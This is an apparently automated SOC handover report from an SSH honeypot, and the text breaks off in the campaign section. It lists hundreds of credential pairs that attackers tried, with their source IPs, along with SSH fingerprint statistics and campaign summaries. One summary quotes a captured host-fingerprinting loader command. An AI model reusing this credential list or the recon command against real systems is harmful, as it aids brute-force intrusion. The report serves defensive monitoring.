# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-08 |
| **Generated At** | 2026-08-08T20:36:05Z |
| **Shift Time** | 20:36 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **393** |
| Confirmed Threats | **274** |
| False Positives Filtered | **119** (30.3%) |
| Unique Attacker IPs | **63** |
| Countries of Origin | **12** |
| High Severity Cases | **319** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **74** |
| Malware Samples Analyzed | **2** HIGH · **24** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **337** |
| Unique Credential Pairs | **304** |
| Unique Usernames | **157** |
| Unique Passwords | **199** |
| Successful Auth Pairs | **326** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 65 |
| `ubuntu` | 9 |
| `admin` | 8 |
| `test` | 7 |
| `ubnt` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 27 |
| `123` | 12 |
| `1234` | 12 |
| `12345` | 8 |
| `12345678` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `usuario` | `usuario` | 5 |
| `support` | `support` | 4 |
| `centos` | `Passw0rd` | 4 |
| `ubnt` | `4` | 3 |
| `ubnt` | `123654` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `P@ssw0rd` | `91.92.42.7` | 2026-08-08T16:55:08 |
| `master` | `passwd` | `91.92.42.7` | 2026-08-08T16:55:13 |
| `root` | `1qaz@WSX` | `91.92.42.7` | 2026-08-08T16:55:19 |
| `admin1` | `admin1` | `91.92.42.7` | 2026-08-08T16:55:25 |
| `test2` | `test2` | `91.92.42.7` | 2026-08-08T16:55:31 |
| `sam` | `abc123` | `91.92.42.7` | 2026-08-08T16:55:37 |
| `test3` | `1` | `91.92.42.7` | 2026-08-08T16:55:43 |
| `ubuntu` | `A123456a` | `91.92.42.7` | 2026-08-08T16:55:49 |
| `tester` | `tester` | `91.92.42.7` | 2026-08-08T16:55:55 |
| `newuser` | `123` | `91.92.42.7` | 2026-08-08T16:56:01 |
| `uploader` | `uploader` | `91.92.42.7` | 2026-08-08T16:56:07 |
| `root` | `123abc456` | `91.92.42.7` | 2026-08-08T16:56:12 |
| `teste` | `teste` | `91.92.42.7` | 2026-08-08T16:56:18 |
| `root` | `!QAZ2wsx3edc` | `91.92.42.7` | 2026-08-08T16:56:24 |
| `debian` | `debian` | `91.92.42.7` | 2026-08-08T16:56:29 |
| `root` | `root12345` | `91.92.42.7` | 2026-08-08T16:56:36 |
| `milad` | `milad` | `91.92.42.7` | 2026-08-08T16:56:42 |
| `frappe` | `frappe` | `91.92.42.7` | 2026-08-08T16:56:48 |
| `openclaw` | `12345` | `91.92.42.7` | 2026-08-08T16:56:54 |
| `root` | `Aa123123` | `91.92.42.7` | 2026-08-08T16:57:01 |
| `root` | `1q2w3e4r` | `91.92.42.7` | 2026-08-08T16:57:07 |
| `ubuntu` | `ubuntu` | `91.92.42.7` | 2026-08-08T16:57:13 |
| `usuario` | `usuario` | `91.92.42.7` | 2026-08-08T16:57:20 |
| `appuser` | `123456` | `91.92.42.7` | 2026-08-08T16:57:27 |
| `default` | `default` | `91.92.42.7` | 2026-08-08T16:57:32 |
| `config` | `qwerty` | `10.0.0.73` | 2026-08-08T16:57:32 |
| `dmdba` | `dmdba` | `91.92.42.7` | 2026-08-08T16:57:39 |
| `root` | `1029384756` | `91.92.42.7` | 2026-08-08T16:57:45 |
| `user2` | `user2` | `91.92.42.7` | 2026-08-08T16:57:51 |
| `ubuntu` | `admin@123` | `91.92.42.7` | 2026-08-08T16:57:59 |
| `ec2-user` | `12345678` | `91.92.42.7` | 2026-08-08T16:58:04 |
| `kali` | `kali` | `91.92.42.7` | 2026-08-08T16:58:11 |
| `gns3` | `gns3` | `91.92.42.7` | 2026-08-08T16:58:17 |
| `onkar` | `onkar123` | `91.92.42.7` | 2026-08-08T16:58:24 |
| `ethan` | `ethan` | `91.92.42.7` | 2026-08-08T16:58:30 |
| `server` | `1234` | `91.92.42.7` | 2026-08-08T16:58:36 |
| `debian` | `123456` | `91.92.42.7` | 2026-08-08T16:58:42 |
| `deploy` | `root` | `91.92.42.7` | 2026-08-08T16:58:50 |
| `sysupdate` | `123456` | `91.92.42.7` | 2026-08-08T16:58:55 |
| `administrator` | `Passw0rd` | `91.92.42.7` | 2026-08-08T16:59:01 |
| `root` | `19901017` | `91.92.42.7` | 2026-08-08T16:59:07 |
| `root` | `Aa@123456` | `91.92.42.7` | 2026-08-08T16:59:13 |
| `student` | `password` | `91.92.42.7` | 2026-08-08T16:59:19 |
| `cloud` | `1234` | `91.92.42.7` | 2026-08-08T16:59:25 |
| `deploy` | `password` | `91.92.42.7` | 2026-08-08T16:59:31 |
| `ecommerce` | `ecommerce` | `91.92.42.7` | 2026-08-08T16:59:38 |
| `postgres` | `postgres` | `91.92.42.7` | 2026-08-08T16:59:44 |
| `frappe` | `12345678` | `91.92.42.7` | 2026-08-08T16:59:51 |
| `david` | `123456` | `91.92.42.7` | 2026-08-08T16:59:58 |
| `neptune` | `neptune` | `91.92.42.7` | 2026-08-08T17:00:05 |
| `root` | `test1234` | `91.92.42.7` | 2026-08-08T17:00:11 |
| `user2` | `123456` | `91.92.42.7` | 2026-08-08T17:00:18 |
| `root` | `1234567` | `80.94.92.179` | 2026-08-08T17:00:24 |
| `steam` | `steam123` | `91.92.42.7` | 2026-08-08T17:00:25 |
| `elasticsearch` | `elasticsearch@1234` | `91.92.42.7` | 2026-08-08T17:00:33 |
| `bernard` | `bernard` | `91.92.42.7` | 2026-08-08T17:00:39 |
| `tester` | `12345` | `91.92.42.7` | 2026-08-08T17:00:45 |
| `ubuntu` | `123321` | `91.92.42.7` | 2026-08-08T17:00:51 |
| `odoo16` | `odoo16` | `91.92.42.7` | 2026-08-08T17:00:57 |
| `main` | `12345` | `91.92.42.7` | 2026-08-08T17:01:03 |
| `ubuntu` | `12345678` | `91.92.42.7` | 2026-08-08T17:01:10 |
| `wso2` | `wso2` | `91.92.42.7` | 2026-08-08T17:01:16 |
| `username` | `password` | `91.92.42.7` | 2026-08-08T17:01:22 |
| `root` | `qwe123456` | `91.92.42.7` | 2026-08-08T17:01:29 |
| `erp` | `erp` | `91.92.42.7` | 2026-08-08T17:01:35 |
| `root` | `redhat` | `91.92.42.7` | 2026-08-08T17:01:42 |
| `xiao` | `xiao` | `91.92.42.7` | 2026-08-08T17:01:48 |
| `linuxuser` | `1` | `91.92.42.7` | 2026-08-08T17:01:55 |
| `runner` | `1234` | `91.92.42.7` | 2026-08-08T17:02:02 |
| `user1` | `root@123` | `91.92.42.7` | 2026-08-08T17:02:08 |
| `ai` | `Aa123456` | `91.92.42.7` | 2026-08-08T17:02:15 |
| `root` | `Aa123456+` | `91.92.42.7` | 2026-08-08T17:02:21 |
| `vbox` | `123456` | `91.92.42.7` | 2026-08-08T17:02:27 |
| `liyang` | `123456` | `91.92.42.7` | 2026-08-08T17:02:33 |
| `claude` | `1234` | `91.92.42.7` | 2026-08-08T17:02:40 |
| `mohammad` | `mohammad` | `91.92.42.7` | 2026-08-08T17:02:47 |
| `ansible` | `passwd` | `91.92.42.7` | 2026-08-08T17:03:00 |
| `ubuntu` | `1qaz@WSX` | `91.92.42.7` | 2026-08-08T17:03:06 |
| `newuser` | `123456` | `91.92.42.7` | 2026-08-08T17:03:13 |
| `ubnt` | `4` | `10.0.0.73` | 2026-08-08T17:03:15 |
| `root` | `Huawei123` | `91.92.42.7` | 2026-08-08T17:03:20 |
| `user` | `passw0rd` | `91.92.42.7` | 2026-08-08T17:03:26 |
| `data` | `data` | `91.92.42.7` | 2026-08-08T17:03:31 |
| `root` | `abc123` | `91.92.42.7` | 2026-08-08T17:03:38 |
| `root` | `qazwsxedc` | `91.92.42.7` | 2026-08-08T17:03:43 |
| `gitlab-runner` | `passwd` | `91.92.42.7` | 2026-08-08T17:03:49 |
| `postgres` | `123` | `91.92.42.7` | 2026-08-08T17:03:55 |
| `operator` | `operator2026` | `91.92.42.7` | 2026-08-08T17:04:01 |
| `mysql` | `mysql123` | `91.92.42.7` | 2026-08-08T17:04:07 |
| `root` | `r00t` | `91.92.42.7` | 2026-08-08T17:04:13 |
| `root` | `12345678` | `80.94.92.179` | 2026-08-08T17:04:14 |
| `test` | `qwerty123` | `91.92.42.7` | 2026-08-08T17:04:19 |
| `user1` | `modzmodz` | `91.92.42.7` | 2026-08-08T17:04:24 |
| `martin` | `martin` | `91.92.42.7` | 2026-08-08T17:04:30 |
| `amir` | `amir` | `91.92.42.7` | 2026-08-08T17:04:36 |
| `amit` | `amit` | `91.92.42.7` | 2026-08-08T17:04:42 |
| `ubnt` | `4` | `136.56.34.147` | 2026-08-08T17:04:47 |
| `support` | `support` | `91.92.42.7` | 2026-08-08T17:04:48 |
| `oracle` | `oracle123` | `91.92.42.7` | 2026-08-08T17:04:53 |
| `ubnt` | `4` | `65.20.251.41` | 2026-08-08T17:04:54 |
| `runner` | `123456` | `91.92.42.7` | 2026-08-08T17:04:59 |
| `claude` | `abc123` | `91.92.42.7` | 2026-08-08T17:05:04 |
| `root` | `147258` | `91.92.42.7` | 2026-08-08T17:05:10 |
| `user1` | `12345` | `91.92.42.7` | 2026-08-08T17:05:15 |
| `username` | `passwd` | `91.92.42.7` | 2026-08-08T17:05:21 |
| `ducc0x` | `phuvanduc` | `91.92.42.7` | 2026-08-08T17:05:27 |
| `security` | `security` | `91.92.42.7` | 2026-08-08T17:05:33 |
| `user1` | `123` | `91.92.42.7` | 2026-08-08T17:05:39 |
| `root` | `toor` | `91.92.42.7` | 2026-08-08T17:05:46 |
| `root` | `P@ssw0rd` | `91.92.42.7` | 2026-08-08T17:05:51 |
| `ftpuser` | `p@ssw0rd` | `91.92.42.7` | 2026-08-08T17:05:58 |
| `fastuser` | `123456789` | `91.92.42.7` | 2026-08-08T17:06:04 |
| `webmaster` | `webmaster` | `91.92.42.7` | 2026-08-08T17:06:09 |
| `test` | `passwd` | `91.92.42.7` | 2026-08-08T17:06:15 |
| `claude` | `root` | `91.92.42.7` | 2026-08-08T17:06:21 |
| `splunk` | `splunk` | `91.92.42.7` | 2026-08-08T17:06:27 |
| `root` | `12qwaszx` | `91.92.42.7` | 2026-08-08T17:06:33 |
| `root` | `qwe123!@#` | `91.92.42.7` | 2026-08-08T17:06:39 |
| `pi` | `toor` | `91.92.42.7` | 2026-08-08T17:06:45 |
| `nobody` | `1234` | `91.92.42.7` | 2026-08-08T17:06:51 |
| `drcomadmin` | `drcomadmin123` | `91.92.42.7` | 2026-08-08T17:06:56 |
| `root` | `12345qwe` | `91.92.42.7` | 2026-08-08T17:07:02 |
| `localhost` | `localhost` | `91.92.42.7` | 2026-08-08T17:07:08 |
| `cloud` | `cloud` | `91.92.42.7` | 2026-08-08T17:07:14 |
| `root` | `123456789` | `80.94.92.179` | 2026-08-08T17:07:14 |
| `app` | `123` | `91.92.42.7` | 2026-08-08T17:07:20 |
| `dev` | `dev` | `91.92.42.7` | 2026-08-08T17:07:25 |
| `root` | `12345qwert` | `91.92.42.7` | 2026-08-08T17:07:30 |
| `operator` | `operator` | `91.92.42.7` | 2026-08-08T17:07:36 |
| `main` | `1234` | `91.92.42.7` | 2026-08-08T17:07:43 |
| `jack` | `1234` | `91.92.42.7` | 2026-08-08T17:07:49 |
| `master` | `123` | `91.92.42.7` | 2026-08-08T17:07:54 |
| `ark` | `ark` | `91.92.42.7` | 2026-08-08T17:08:00 |
| `sns` | `sns` | `4.240.82.91` | 2026-08-08T17:08:06 |
| `oscar` | `1234` | `91.92.42.7` | 2026-08-08T17:08:07 |
| `guest` | `guest123` | `91.92.42.7` | 2026-08-08T17:08:13 |
| `ftp` | `123456` | `91.92.42.7` | 2026-08-08T17:08:19 |
| `node` | `123456` | `91.92.42.7` | 2026-08-08T17:08:25 |
| `devops` | `123456789` | `91.92.42.7` | 2026-08-08T17:08:32 |
| `345gs5662d34` | `345gs5662d34` | `4.240.82.91` | 2026-08-08T17:08:34 |
| `es` | `123456` | `91.92.42.7` | 2026-08-08T17:08:38 |
| `odoo14` | `odoo14` | `91.92.42.7` | 2026-08-08T17:08:45 |
| `alex` | `Ab123456` | `91.92.42.7` | 2026-08-08T17:08:52 |
| `sns` | `3245gs5662d34` | `4.240.82.91` | 2026-08-08T17:08:57 |
| `steam` | `1` | `91.92.42.7` | 2026-08-08T17:08:58 |
| `adminuser` | `123456` | `91.92.42.7` | 2026-08-08T17:09:05 |
| `ai` | `toor` | `91.92.42.7` | 2026-08-08T17:09:12 |
| `gitlab-runner` | `123` | `91.92.42.7` | 2026-08-08T17:09:18 |
| `admin` | `111111` | `91.92.42.7` | 2026-08-08T17:09:24 |
| `root` | `123321` | `91.92.42.7` | 2026-08-08T17:09:30 |
| `ftpuser` | `123` | `91.92.42.7` | 2026-08-08T17:09:37 |
| `ubnt` | `123654` | `10.0.0.73` | 2026-08-08T17:09:38 |
| `dev` | `1qaz2wsx` | `91.92.42.7` | 2026-08-08T17:09:45 |
| `lin` | `123456` | `91.92.42.7` | 2026-08-08T17:09:51 |
| `sam` | `1234567890` | `91.92.42.7` | 2026-08-08T17:09:57 |
| `root` | `123` | `91.92.42.7` | 2026-08-08T17:10:03 |
| `odoo14` | `odoo` | `91.92.42.7` | 2026-08-08T17:10:09 |
| `admin123` | `admin123` | `91.92.42.7` | 2026-08-08T17:10:16 |
| `deploy` | `deploy` | `91.92.42.7` | 2026-08-08T17:10:22 |
| `root` | `1234abcd` | `80.94.92.179` | 2026-08-08T17:10:24 |
| `admin` | `root` | `91.92.42.7` | 2026-08-08T17:10:28 |
| `opc` | `opc` | `91.92.42.7` | 2026-08-08T17:10:35 |
| `root` | `root1234` | `91.92.42.7` | 2026-08-08T17:10:42 |
| `root` | `Aa111111.` | `91.92.42.7` | 2026-08-08T17:10:48 |
| `customer` | `customer` | `91.92.42.7` | 2026-08-08T17:10:55 |
| `tester` | `test` | `91.92.42.7` | 2026-08-08T17:11:02 |
| `cloud` | `cloud123!` | `91.92.42.7` | 2026-08-08T17:11:08 |
| `git` | `123456` | `91.92.42.7` | 2026-08-08T17:11:15 |
| `deploy` | `123456` | `91.92.42.7` | 2026-08-08T17:11:22 |
| `redhat` | `redhat` | `91.92.42.7` | 2026-08-08T17:11:28 |
| `prem` | `12345` | `91.92.42.7` | 2026-08-08T17:11:35 |
| `server` | `server` | `91.92.42.7` | 2026-08-08T17:11:42 |
| `git` | `123` | `91.92.42.7` | 2026-08-08T17:11:48 |
| `admin1` | `redhat` | `91.92.42.7` | 2026-08-08T17:11:54 |
| `chris` | `123456` | `91.92.42.7` | 2026-08-08T17:12:00 |
| `elastic` | `123456` | `91.92.42.7` | 2026-08-08T17:12:06 |
| `teamspeak` | `123456` | `91.92.42.7` | 2026-08-08T17:12:12 |
| `server` | `12345` | `91.92.42.7` | 2026-08-08T17:12:18 |
| `teamspeak` | `root` | `91.92.42.7` | 2026-08-08T17:12:24 |
| `user1` | `user1` | `91.92.42.7` | 2026-08-08T17:12:30 |
| `mysql` | `mysql@1234` | `91.92.42.7` | 2026-08-08T17:12:36 |
| `worker` | `worker` | `91.92.42.7` | 2026-08-08T17:12:42 |
| `node` | `node` | `91.92.42.7` | 2026-08-08T17:12:48 |
| `jellyfin` | `123` | `91.92.42.7` | 2026-08-08T17:12:54 |
| `hadoop` | `123` | `91.92.42.7` | 2026-08-08T17:13:00 |
| `jenkins` | `jenkins` | `91.92.42.7` | 2026-08-08T17:13:05 |
| `root` | `Welcome123` | `91.92.42.7` | 2026-08-08T17:13:11 |
| `gabriel` | `1q2w3e4r` | `91.92.42.7` | 2026-08-08T17:13:17 |
| `deployer` | `1234567890` | `91.92.42.7` | 2026-08-08T17:13:23 |
| `uftp` | `uftp` | `91.92.42.7` | 2026-08-08T17:13:29 |
| `root` | `123abc` | `80.94.92.179` | 2026-08-08T17:13:34 |
| `postgres` | `1` | `91.92.42.7` | 2026-08-08T17:13:35 |
| `demo` | `demo` | `91.92.42.7` | 2026-08-08T17:13:41 |
| `playground` | `playground` | `91.92.42.7` | 2026-08-08T17:13:47 |
| `oracle` | `Aa123456` | `91.92.42.7` | 2026-08-08T17:13:53 |
| `agent` | `agent` | `91.92.42.7` | 2026-08-08T17:13:59 |
| `root` | `qazwsx123` | `91.92.42.7` | 2026-08-08T17:14:06 |
| `debian` | `Aa123456.` | `91.92.42.7` | 2026-08-08T17:14:13 |
| `deployer` | `user` | `91.92.42.7` | 2026-08-08T17:14:19 |
| `root` | `123@@@` | `91.92.42.7` | 2026-08-08T17:14:25 |
| `ubuntu` | `qwe123456` | `91.92.42.7` | 2026-08-08T17:14:31 |
| `www` | `123321` | `91.92.42.7` | 2026-08-08T17:14:36 |
| `jay` | `jay` | `91.92.42.7` | 2026-08-08T17:14:42 |
| `web` | `web123` | `91.92.42.7` | 2026-08-08T17:14:48 |
| `ubuntu` | `123456789` | `91.92.42.7` | 2026-08-08T17:14:54 |
| `ftpuser` | `ftpuser` | `91.92.42.7` | 2026-08-08T17:15:00 |
| `vncuser` | `vncuser` | `91.92.42.7` | 2026-08-08T17:15:06 |
| `rocky` | `1` | `91.92.42.7` | 2026-08-08T17:15:12 |
| `dev` | `123321` | `91.92.42.7` | 2026-08-08T17:15:17 |
| `installer` | `12345` | `91.92.42.7` | 2026-08-08T17:15:24 |
| `nutanix` | `nutanix/4u` | `91.92.42.7` | 2026-08-08T17:15:29 |
| `username` | `username` | `91.92.42.7` | 2026-08-08T17:15:35 |
| `bot` | `bot` | `91.92.42.7` | 2026-08-08T17:15:41 |
| `vpn` | `vpn` | `91.92.42.7` | 2026-08-08T17:15:47 |
| `root` | `123qwe!@` | `91.92.42.7` | 2026-08-08T17:15:52 |
| `monitor` | `monitor` | `91.92.42.7` | 2026-08-08T17:15:59 |
| `parsa` | `parsa` | `91.92.42.7` | 2026-08-08T17:16:04 |
| `admin` | `1qaz@WSX` | `91.92.42.7` | 2026-08-08T17:16:10 |
| `user` | `1234` | `91.92.42.7` | 2026-08-08T17:16:18 |
| `packer` | `packer` | `91.92.42.7` | 2026-08-08T17:16:25 |
| `claude` | `claude` | `91.92.42.7` | 2026-08-08T17:16:32 |
| `root` | `123qwe` | `80.94.92.179` | 2026-08-08T17:16:38 |
| `gabriel` | `gabriel` | `91.92.42.7` | 2026-08-08T17:16:38 |
| `test` | `test@123` | `91.92.42.7` | 2026-08-08T17:16:44 |
| `portal` | `portal` | `91.92.42.7` | 2026-08-08T17:16:50 |
| `test` | `123456789` | `91.92.42.7` | 2026-08-08T17:16:56 |
| `rancher` | `rancher` | `91.92.42.7` | 2026-08-08T17:17:03 |
| `user` | `qwe123456` | `91.92.42.7` | 2026-08-08T17:17:10 |
| `frank` | `frank` | `91.92.42.7` | 2026-08-08T17:17:16 |
| `odoo18` | `odoo` | `91.92.42.7` | 2026-08-08T17:17:22 |
| `user` | `1qaz@WSX` | `91.92.42.7` | 2026-08-08T17:17:29 |
| `openclaw` | `123456` | `91.92.42.7` | 2026-08-08T17:17:35 |
| `root` | `hello123` | `91.92.42.7` | 2026-08-08T17:17:41 |
| `root` | `admin@123` | `91.92.42.7` | 2026-08-08T17:17:47 |
| `root` | `aB123456` | `91.92.42.7` | 2026-08-08T17:17:54 |
| `root` | `11` | `91.92.42.7` | 2026-08-08T17:18:01 |
| `postgres` | `123456` | `91.92.42.7` | 2026-08-08T17:18:08 |
| `root` | `qwertyuiop` | `91.92.42.7` | 2026-08-08T17:18:15 |
| `root` | `changemeNOW` | `91.92.42.7` | 2026-08-08T17:18:21 |
| `root` | `Ac123456` | `91.92.42.7` | 2026-08-08T17:18:28 |
| `ftp` | `ftp123` | `91.92.42.7` | 2026-08-08T17:18:35 |
| `git` | `dev` | `91.92.42.7` | 2026-08-08T17:18:41 |
| `pi` | `pi` | `91.92.42.7` | 2026-08-08T17:18:48 |
| `z` | `qwe123` | `91.92.42.7` | 2026-08-08T17:18:55 |
| `user3` | `user3` | `91.92.42.7` | 2026-08-08T17:19:03 |
| `admin` | `E4IuG88G` | `91.92.42.7` | 2026-08-08T17:19:09 |
| `test` | `1234qwer` | `91.92.42.7` | 2026-08-08T17:19:16 |
| `hu` | `123456` | `91.92.42.7` | 2026-08-08T17:19:22 |
| `root` | `passwd` | `91.92.42.7` | 2026-08-08T17:19:29 |
| `user3` | `12345678` | `91.92.42.7` | 2026-08-08T17:19:36 |
| `root` | `qwe123` | `91.92.42.7` | 2026-08-08T17:19:43 |
| `alex` | `1234` | `91.92.42.7` | 2026-08-08T17:19:50 |
| `root` | `1q2w3e` | `80.94.92.179` | 2026-08-08T17:19:55 |
| `root` | `dxfUgwfiNcx8` | `91.92.42.7` | 2026-08-08T17:19:56 |
| `deploy` | `rootroot` | `91.92.42.7` | 2026-08-08T17:20:02 |
| `dmdba` | `dmdba123456` | `91.92.42.7` | 2026-08-08T17:20:07 |
| `user` | `git` | `91.92.42.7` | 2026-08-08T17:20:14 |
| `admin` | `123456789` | `91.92.42.7` | 2026-08-08T17:20:20 |
| `kafka` | `kafka` | `91.92.42.7` | 2026-08-08T17:20:27 |
| `osmc` | `osmc` | `91.92.42.7` | 2026-08-08T17:20:33 |
| `root` | `1q2w3e4r` | `80.94.92.179` | 2026-08-08T17:23:16 |
| `root` | `1qaz2wsx` | `80.94.92.179` | 2026-08-08T17:26:17 |
| `ubnt` | `123654` | `124.239.129.2` | 2026-08-08T17:28:15 |
| `root` | `321` | `80.94.92.179` | 2026-08-08T17:29:30 |
| `support` | `support` | `176.53.159.196` | 2026-08-08T17:30:24 |
| `root` | `654321` | `80.94.92.179` | 2026-08-08T17:32:30 |
| `xxx` | `xxx` | `176.172.239.193` | 2026-08-08T17:33:04 |
| `root` | `P@ssw0rd` | `80.94.92.179` | 2026-08-08T17:36:14 |
| `supervisor` | `administrator` | `187.8.120.90` | 2026-08-08T17:38:28 |
| `root` | `adminadmin` | `220.122.115.9` | 2026-08-08T17:39:25 |
| `root` | `adminadmin` | `182.42.113.10` | 2026-08-08T17:39:38 |
| `admin` | `admin` | `94.154.43.210` | 2026-08-08T17:43:34 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.150.190` | 2026-08-08T17:48:13 |
| `supervisor` | `administrator` | `10.0.0.73` | 2026-08-08T17:49:59 |
| `root` | `P@ssword` | `80.94.92.179` | 2026-08-08T17:53:47 |
| `root` | `adminadmin` | `218.149.235.152` | 2026-08-08T17:55:50 |
| `sol` | `sol` | `2.57.122.238` | 2026-08-08T17:58:34 |
| `solana` | `solana` | `2.57.122.238` | 2026-08-08T18:00:19 |
| `root` | `hello2025` | `5.252.226.244` | 2026-08-08T18:00:33 |
| `345gs5662d34` | `345gs5662d34` | `5.252.226.244` | 2026-08-08T18:00:36 |
| `root` | `3245gs5662d34` | `5.252.226.244` | 2026-08-08T18:00:37 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-08T18:01:18 |
| `support` | `support` | `10.0.0.73` | 2026-08-08T18:01:52 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-08-08T18:02:01 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-08-08T18:03:38 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-08-08T18:05:12 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-08-08T18:06:49 |
| `supervisor` | `administrator` | `70.89.116.5` | 2026-08-08T18:07:27 |
| `firedancer` | `firedancer` | `2.57.122.238` | 2026-08-08T18:08:24 |
| `node` | `node` | `2.57.122.238` | 2026-08-08T18:09:56 |
| `node` | `1234` | `2.57.122.238` | 2026-08-08T18:11:31 |
| `usuario` | `usuario` | `10.0.0.73` | 2026-08-08T18:12:25 |
| `node` | `123456` | `2.57.122.238` | 2026-08-08T18:13:11 |
| `usuario` | `usuario` | `96.56.228.149` | 2026-08-08T18:13:52 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-08-08T18:14:51 |
| `eth` | `eth` | `2.57.122.238` | 2026-08-08T18:16:28 |
| `polygon` | `polygon` | `2.57.122.238` | 2026-08-08T18:18:08 |
| `centos` | `Passw0rd` | `10.0.0.73` | 2026-08-08T18:18:10 |
| `tron` | `tron` | `2.57.122.238` | 2026-08-08T18:19:45 |
| `trx` | `trx` | `2.57.122.238` | 2026-08-08T18:21:22 |
| `validator` | `ethereum` | `2.57.122.238` | 2026-08-08T18:22:55 |
| `root` | `Root@123` | `10.0.0.73` | 2026-08-08T18:24:22 |
| `sepolia` | `sepolia` | `2.57.122.238` | 2026-08-08T18:24:32 |
| `avalanche` | `avalanche` | `2.57.122.238` | 2026-08-08T18:26:11 |
| `solv` | `solv` | `2.57.122.238` | 2026-08-08T18:27:48 |
| `solv` | `1234` | `2.57.122.238` | 2026-08-08T18:29:25 |
| `usuario` | `usuario` | `187.218.57.50` | 2026-08-08T18:30:22 |
| `usuario` | `usuario` | `111.70.32.11` | 2026-08-08T18:30:30 |
| `solv` | `123456` | `2.57.122.238` | 2026-08-08T18:31:07 |
| `solv` | `12345678` | `2.57.122.238` | 2026-08-08T18:32:49 |
| `centos` | `Passw0rd` | `103.93.37.178` | 2026-08-08T18:36:55 |
| `centos` | `Passw0rd` | `124.133.10.66` | 2026-08-08T18:37:04 |
| `ubuntu` | `ubuntu` | `2.57.122.238` | 2026-08-08T18:37:38 |
| `validator` | `validator` | `2.57.122.238` | 2026-08-08T18:39:18 |
| `sol` | `sol123` | `2.57.122.238` | 2026-08-08T18:40:54 |
| `sol` | `123` | `2.57.122.238` | 2026-08-08T18:42:29 |
| `sol` | `12345678` | `2.57.122.238` | 2026-08-08T18:44:12 |
| `trading` | `trading` | `2.57.122.238` | 2026-08-08T18:45:55 |
| `trader` | `trader` | `2.57.122.238` | 2026-08-08T18:47:35 |
| `test` | `test123` | `117.241.77.78` | 2026-08-08T18:48:27 |
| `test` | `test123` | `64.72.74.162` | 2026-08-08T18:48:34 |
| `tradingbot` | `tradingbot` | `2.57.122.238` | 2026-08-08T18:49:11 |
| `bot` | `bot` | `2.57.122.238` | 2026-08-08T18:50:52 |
| `apache` | `apache` | `10.0.0.73` | 2026-08-08T18:52:14 |
| `bot` | `123456` | `2.57.122.238` | 2026-08-08T18:52:31 |
| `bot` | `12345` | `2.57.122.238` | 2026-08-08T18:54:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **393** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 301 |
| OpenSSH | 21 |
| libssh | 13 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 246 | 1 |
| `16443846184e...` | Generic scanner | 35 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 16 | 16 |
| `2ec37a7cc8da...` | Mirai/variant | 14 | 1 |
| `f555226df196...` | Mirai/variant | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 246 | 1 | Generic scanner |
| `16443846184e...` | Go SSH scanner | 35 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 16 | 16 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 14 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 2 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 13 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1592, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.179`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
